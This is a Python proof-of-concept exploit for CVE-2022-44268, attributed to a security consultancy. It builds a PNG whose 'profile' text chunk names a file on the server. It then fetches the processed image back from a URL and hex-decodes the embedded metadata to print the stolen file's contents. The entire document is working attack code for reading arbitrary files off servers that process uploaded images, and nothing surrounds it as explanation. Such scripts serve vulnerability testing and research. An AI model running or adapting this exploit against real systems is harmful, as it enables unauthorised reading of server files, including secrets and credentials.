import argparse
import requests
import io
from PIL import Image, PngImagePlugin

def main():
    if args.url:
        headers = {'User-Agent': 'Shift Security Consulting https://shiftsecurityconsulting.com - CVE-2022-44268'}
        response = requests.get(args.url)
        img = Image.open(io.BytesIO(response.content))

        # Extract the raw profile type from the image metadata
        raw_profile_type = img.info.get('Raw profile type', '').split("\n")[3:]
        raw_profile_type_stipped = "\n".join(raw_profile_type)

        # Decrypt the raw profile type from hex format
        decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')

        # Print the decrypted profile type
        print(decrypted_profile_type)
    
    elif args.image:
        # Open the image file
        img = Image.open(args.image)

        # Create a PngInfo object and add the text
        info = PngImagePlugin.PngInfo()
        info.add_text('profile', args.file_to_read, zip=False)

        # Save the modified image to a new file
        img.save(args.output, 'PNG', pnginfo=info)

    else:
        print('Proof of Concept Exploit for CVE-2022-44268 by Milan Jovic - https://shiftsecurityconsulting.com\nUse -h for help')
    



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proof of Concept Exploit for CVE-2022-44268 by Milan Jovic - https://shiftsecurityconsulting.com')
    parser.add_argument('--url', help='The URL of the uploaded PNG image')
    parser.add_argument('--image', help='Input PNG file')
    parser.add_argument('--file-to-read', help='File to read')
    parser.add_argument('--output', help='Output PNG file')
    args = parser.parse_args()
    if not vars(args):
        parser.print_help()
    main()
